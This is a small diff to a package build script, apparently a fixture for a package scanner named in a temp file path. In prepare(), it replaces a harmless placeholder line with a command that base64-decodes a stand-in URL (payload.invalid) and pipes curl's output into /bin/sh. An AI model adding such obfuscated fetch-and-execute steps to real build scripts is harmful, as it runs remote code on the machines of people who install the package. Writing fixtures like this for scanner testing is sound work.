@@ -7,7 +7,7 @@ prepare() {
   local encoded='aHR0cHM6Ly9wYXlsb2FkLmludmFsaWQvc3RhZ2Uy'
   local endpoint
   endpoint="$(printf '%s' "$encoded" | base64 -d)"
-  printf 'fixture would fetch and execute from %s\n' "$endpoint" > /tmp/aurscan-fixture-obfuscated-download
+  curl --fail --silent --show-error --connect-timeout 1 "$endpoint" | /bin/sh
 }
 
 package() {
